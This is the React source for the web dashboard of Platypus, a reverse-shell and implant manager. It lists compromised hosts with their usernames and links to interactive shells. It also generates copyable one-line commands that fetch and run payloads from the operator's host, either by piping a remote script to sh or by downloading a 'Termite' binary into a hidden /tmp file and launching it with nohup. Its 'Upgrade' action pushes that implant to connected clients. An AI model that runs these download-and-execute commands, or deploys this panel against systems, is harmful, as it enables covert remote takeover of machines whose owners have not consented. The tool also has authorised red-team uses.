import React from "react";
import {
  message,
  InputNumber,
  Table,
  Tag,
  Divider,
  Button,
  Tooltip,
  Progress,
  Input,
  Badge,
  Layout,
  Menu,
  Alert,
  Tabs,
  List,
  Select,
  Descriptions,
  Collapse,
} from "antd";

import { LockOutlined, UnlockOutlined } from '@ant-design/icons';
import "./App.css";
import qs from "qs";
import { CopyToClipboard } from "react-copy-to-clipboard";
const { Panel } = Collapse;
const axios = require("axios");
axios.defaults.headers.post["Content-Type"] =
  "application/x-www-form-urlencoded";
const { TabPane } = Tabs;
const { Option } = Select;
const moment = require("moment");
var W3CWebSocket = require("websocket").w3cwebsocket;
var randomstring = require("randomstring");
var filesize = require("filesize");

message.config({
  duration: 3,
  maxCount: 5,
  rtl: true,
});

const { Header, Content, Sider } = Layout;

let endPoint = window.location.host;
let baseUrl = ["http://", endPoint].join("");
let apiUrl = [baseUrl, "/api"].join("");
let wsUrl = ["ws://", endPoint, "/notify"].join("");


function upgradeToTermite(clientHash, target) {
  axios
    .get(apiUrl + "/client/" + clientHash + "/upgrade/" + target)
    .then((response) => {
      console.log(response)
    })
}

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      bottom: "bottomLeft",
      serversMap: null,
      serversList: [],
      currentServer: null,
      serverCreateHost: "0.0.0.0",
      serverCreatePort: Math.floor(Math.random() * 65536),
    };
  }

  fetchData() {
    axios
      .get([apiUrl, "/server"].join(""))
      .then((response) => {
        if (Object.values(response.data.msg).length > 0) {
          this.setState({
            serversMap: response.data.msg.servers,
            serversList: Object.values(response.data.msg.servers),
            currentServer: Object.values(response.data.msg.servers)[0],
            distributor: response.data.msg.distributor
          });
        }
      })
      .catch((error) => {
        message.error("Cannot connect to API EndPoint: " + error, 5);
      });
  }

  componentDidMount() {
    let _this = this;
    _this.fetchData();

    var client = new W3CWebSocket(wsUrl);
    client.onerror = () => {
      // message.error("WebSocket connect failed!", 5);
    };
    client.onopen = () => {
      // message.success("WebSocket connected!", 5);
    };
    client.onmessage = (e) => {
      let CLIENT_CONNECTED = 0;
      let CLIENT_DUPLICATED = 1;
      let SERVER_DUPLICATED = 2;
      let COMPILING_TERMITE = 3;
      let COMPRESSING_TERMITE = 4;
      let UPLOADING_TERMITE = 5;

      let data = JSON.parse(e.data);

      let serverHash, clientHash, newServersMap

      switch (data.Type) {
        case CLIENT_CONNECTED:
          console.log(data);
          let onlinedClient = data.Data.Client;
          serverHash = data.Data.ServerHash;
          message.success(
            "New client connected from: " +
            onlinedClient.host +
            ":" +
            onlinedClient.port,
            5
          );

          newServersMap = this.state.serversMap;
          if (newServersMap[serverHash].encrypted) {
            newServersMap[serverHash].termite_clients[onlinedClient.hash] = onlinedClient;
          } else {
            newServersMap[serverHash].clients[onlinedClient.hash] = onlinedClient;
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break;
        case CLIENT_DUPLICATED:
          let duplicatedClient = data.Data.Client;
          message.error(
            "Duplicated client connected from: " +
            duplicatedClient.host +
            ":" +
            duplicatedClient.port +
            ", connection reseted.",
            5
          );
          break;
        case SERVER_DUPLICATED:
          let duplicatedServer = data.Data;
          message.error(
            "Duplicated server: " +
            duplicatedServer.host +
            ":" +
            duplicatedServer.port,
            5
          );
          break;

        case COMPILING_TERMITE:
          let compilingProgress = data.Data;
          clientHash = compilingProgress.Client.hash;
          serverHash = compilingProgress.ServerHash;
          let cp = compilingProgress.Progress

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].compiling_progress = cp
          if (newServersMap[serverHash].clients[clientHash].compiling_progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Compile sucessfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = "Compiling..."
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break
        case COMPRESSING_TERMITE:
          let compressingProgress = data.Data;
          clientHash = compressingProgress.Client.hash;
          serverHash = compressingProgress.ServerHash;
          let p = compressingProgress.Progress

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].compressing_progress = p

          if (newServersMap[serverHash].clients[clientHash].compressing_progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Compress successfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = "Compressing..."
          }

          _this.setState({
            serversMap: newServersMap,
          });
          break
        case UPLOADING_TERMITE:
          let uploadingProgress = data.Data;
          clientHash = uploadingProgress.Client.hash;
          serverHash = uploadingProgress.ServerHash;
          let bytesSent = uploadingProgress.BytesSent
          let bytesTotal = uploadingProgress.BytesTotal

          newServersMap = this.state.serversMap;
          newServersMap[serverHash].clients[clientHash].progress = (bytesSent / bytesTotal) * 100;

          if (newServersMap[serverHash].clients[clientHash].progress === 100) {
            newServersMap[serverHash].clients[clientHash].alert = "Upgrade successfully!"
          } else {
            newServersMap[serverHash].clients[clientHash].alert = filesize(bytesSent) + " / " + filesize(bytesTotal)
          }
          _this.setState({
            serversMap: newServersMap,
          });
          break;
        default:
          break;
      }
    };
    client.onclose = () => {
      message.error("WebSocket disconnected!", 5);
    };
  }

  render() {

    const columns = [
      {
        title: "Address",
        dataIndex: "host",
        key: "host",
        align: "center",
        render: (data, line, index) => {
          return (
            <Tooltip title={"Hash:" + line.hash}>
              <span>{line.host + ":" + line.port}</span>
            </Tooltip>
          );
        },
      },
      {
        title: "OS",
        dataIndex: "os",
        key: "os",
        align: "center",
        render: (data) => {
          switch (data) {
            case 1:
              return "Linux";
            case 2:
              return "Windows";
            case 3:
              return "SunOS";
            case 4:
              return "MacOS";
            case 5:
              return "FreeBSD";
            default:
              return "Unknown Operating System";
          }
        },
      },
      {
        title: "Username",
        dataIndex: "user",
        key: "user",
        align: "center",
        render: (data) => {
          let color = "green";
          if (data === "root") {
            color = "red";
          }
          return <Tag color={color}>{data}</Tag>;
        },
      },
      {
        title: "Online Time",
        dataIndex: "timestamp",
        key: "timestamp",
        align: "center",
        render: (data) => {
          return "Onlined at " + moment(data).fromNow();
        },
      },
      {
        title: "Action",
        key: "x",
        render: (data, line, index) => {
          let upgradeButton;
          if (line.CurrentProcessKey === undefined) {
            let target = null
            this.state.serversList.forEach(function(entry){
              if (entry.encrypted) {
                target = entry.host + ":" + entry.port
              }
            })
            if (target == null) {
              upgradeButton = <Button disabled={true} onClick={() => upgradeToTermite(line.hash, target)}>
              Upgrade
            </Button>

            } else {
              upgradeButton = <Button onClick={() => upgradeToTermite(line.hash, target)}>
              Upgrade
            </Button>
            }
          } else {
            upgradeButton = ""
          }
    
          return (
            <>
              <Button>
                <a
                  href={baseUrl + "/shell/?" + line.hash}
                  target={"_blank"}
                  rel={"noreferrer noopener"}
                >
                  Shell
              </a>
              </Button>
              {upgradeButton}
            </>
          );
        },
      },
      {
        title: "Progress",
        dataIndex: "progress",
        key: "progress",
        align: "center",
        render: (data, line, index) => {
          return <>
            <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert} type="success" />
            <Progress percent={line.compiling_progress} size="small" status={line.compiling_progress === 100 ? "" : "active"} />
            <Progress percent={line.compressing_progress} size="small" status={line.compressing_progress === 100 ? "" : "active"} />
            <Progress percent={Math.round(line.progress)} size="small" status={line.progress === 100 ? "" : "active"} />
          </>
        },
      }
    ];
    

    let interfaceMenu;
    if (this.state.currentServer === null) {
      interfaceMenu = (
        <Select
          showSearch
          style={{ width: 200 }}
          placeholder="Select an interface"
          optionFilterProp="children"
          onChange={(value) => {
            this.setState({ serverCreateHost: value });
          }}
          filterOption={(input, option) =>
            option.children.toLowerCase().indexOf(input.toLowerCase()) >= 0
          }
          defaultValue={this.state.serverCreateHost}
        >
          <Option value="0.0.0.0">0.0.0.0</Option>
          <Option value="127.0.0.1">127.0.0.1</Option>
        </Select>
      );
    } else {
      interfaceMenu = (
        <Select
          showSearch
          style={{ width: 200 }}
          placeholder="Select an interface"
          optionFilterProp="children"
          onChange={(value) => {
            this.setState({ serverCreateHost: value });
          }}
          filterOption={(input, option) =>
            option.children.toLowerCase().indexOf(input.toLowerCase()) >= 0
          }
        >
          <Option value="0.0.0.0">0.0.0.0</Option>
          {Object.values(this.state.currentServer.interfaces).map((value, index) => {
            return <Option value={value}>{value}</Option>;
          })}
        </Select>
      );
    }

    let hint;
    if (this.state.currentServer === null) {
      hint = (
        <Alert
          message="Warning"
          description="Please start and select a server"
          type="warning"
          showIcon
          closable
        />
      );
    } else {
      let hintTabs
      if (this.state.currentServer.encrypted) {
        hintTabs = <Tabs defaultActiveKey="0">
          {this.state.distributor.interfaces.map((value, index) => {
            let url = "http://" + value + ":" + this.state.distributor.port
            let command, filename, target
            let data = []
            Object.values(this.state.currentServer.interfaces).map((value, index) => {
              filename = "/tmp/." + randomstring.generate(4)
              target = value + ":" + this.state.currentServer.port
              command = "curl -fsSL " + url + "/termite/"  + target + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
              data.push({ target: value + ":" + this.state.currentServer.port, command: command })
              return command
            })

            let commands = <List
              size="small"
              header={<div>Termite oneline command</div>}
              footer={<div></div>}
              bordered
              dataSource={data}
              renderItem={item => <List.Item>
                {"Connect back: " + item.target}
                <Input addonAfter={<CopyToClipboard
                  text={item.command}
                  onCopy={() => this.setState({ copied: true })}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
                } defaultValue={item.command} />
              </List.Item>}
            />

            return (
              <TabPane tab={value} key={index}>
                {commands}
              </TabPane>
            );
          })}
        </Tabs>
      } else {
        hintTabs = <Tabs defaultActiveKey="0">
          {this.state.currentServer.interfaces.map((value, index) => {
            let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
            return (
              <TabPane tab={value} key={index}>
                <Tag>{command}</Tag>
                <CopyToClipboard
                  text={command}
                  onCopy={() => this.setState({ copied: true })}
                >
                  <button>Click to copy</button>
                </CopyToClipboard>
              </TabPane>
            );
          })}
        </Tabs>
      }
      hint = (
        <div>
          <Descriptions title="Server Info">
            <Descriptions.Item label="Address">
              {this.state.currentServer.host +
                ":" +
                this.state.currentServer.port}
            </Descriptions.Item>
            <Descriptions.Item label="Clients">
              {this.state.currentServer
                ? Object.keys(this.state.currentServer.clients).length + Object.keys(this.state.currentServer.termite_clients).length
                : 0}
            </Descriptions.Item>
            <Descriptions.Item label="Started">
              {moment(this.state.currentServer.timestamp).fromNow()}
            </Descriptions.Item>
          </Descriptions>
          <Collapse defaultActiveKey={["1"]}>
            <Panel
              header="Expand to show the reverse shell commands for the current server"
              key="1"
            >
              {hintTabs}
            </Panel>
          </Collapse>
        </div>
      );
    }

    let dataSource;
    let table;
    if (this.state.currentServer) {
      if (this.state.currentServer.encrypted) {
        dataSource = Object.values(this.state.currentServer.termite_clients)
        table = <Table
          columns={columns.slice(0, columns.length - 1)}
          pagination={{ position: [this.state.bottom] }}
          dataSource={dataSource}
        />
      } else {
        dataSource = Object.values(this.state.currentServer.clients)
        table = <Table
          columns={columns}
          pagination={{ position: [this.state.bottom] }}
          dataSource={dataSource}
        />
      }
    } else {
      dataSource = []
    }



    return (
      <Layout>
        <Header className="header">
          <div className="logo" />
          <h1>
            <a href="https://github.com/WangYihang/Platypus" rel="noreferrer noopener">Platypus</a>
          </h1>
        </Header>
        <Layout style={{ height: "100%" }}>
          <Sider width={200} className="site-layout-background">
            <Menu
              mode="inline"
              defaultSelectedKeys={["1"]}
              defaultOpenKeys={["sub1"]}
              style={{ height: "100%" }}
            >
              <InputNumber
                min={1}
                max={65565}
                defaultValue={this.state.serverCreatePort}
                value={this.state.serverCreatePort}
                onChange={(data) => {
                  this.setState({
                    serverCreatePort: parseInt(data),
                  });
                }}
              />

              {interfaceMenu}

              <Button
                type="primary"
                onClick={() => {
                  axios
                    .post(
                      [apiUrl, "/server"].join(""),
                      qs.stringify({
                        host: this.state.serverCreateHost,
                        port: this.state.serverCreatePort,
                      })
                    )
                    .then((response) => {
                      console.log(response);
                      if (response.data.status) {
                        message.success(
                          "Server created at: " +
                          response.data.msg.host +
                          ":" +
                          response.data.msg.port,
                          5
                        );
                        let newServer = response.data.msg;
                        this.setState({
                          serversList: [...this.state.serversList, newServer],
                        });
                        const newServersMap = this.state.serversMap;
                        newServersMap[newServer.hash] = newServer;
                        this.setState({
                          serversMap: newServersMap,
                          serverCreatePort: Math.floor(Math.random() * 65536),
                        });
                      } else {
                        message.error(
                          "Server create failed: " + response.data.msg,
                          5
                        );
                      }
                    })
                    .catch((error) => {
                      message.error(
                        "Cannot connect to API EndPoint!" + error,
                        5
                      );
                    });
                }}
              >
                Add server
              </Button>

              {this.state.serversList.map((value, index) => {
                let lockIcon;
                if (value.encrypted) {
                  lockIcon = <Tooltip title={"Secure Protocol"}>
                    <LockOutlined style={{ color: "green" }} />
                  </Tooltip>
                } else {
                  lockIcon = <Tooltip title={"Reverse Shell Protocol"}>
                    <UnlockOutlined style={{ color: "red" }} />
                  </Tooltip>

                }
                return <Menu.Item
                  key={value.hash}
                  onClick={(item, key, keyPath, domEvent) => {
                    this.setState({
                      currentServer: this.state.serversMap[item.key],
                    });
                  }}
                >
                  {lockIcon}
                  {value.host + ":" + value.port}
                  <Badge
                    count={Object.keys(value.clients).length + Object.keys(value.termite_clients).length}
                    overflowCount={99}
                    offset={[10, 0]}
                  ></Badge>
                </Menu.Item>
              })}
            </Menu>
          </Sider>
          <Layout style={{ padding: "0 24px 24px" }}>
            <Content style={{ margin: "0 0" }}>
              {hint}
              <Divider orientation="left"></Divider>
              {table}
            </Content>
          </Layout>
        </Layout>
      </Layout>
    );
  }
}

export default App;
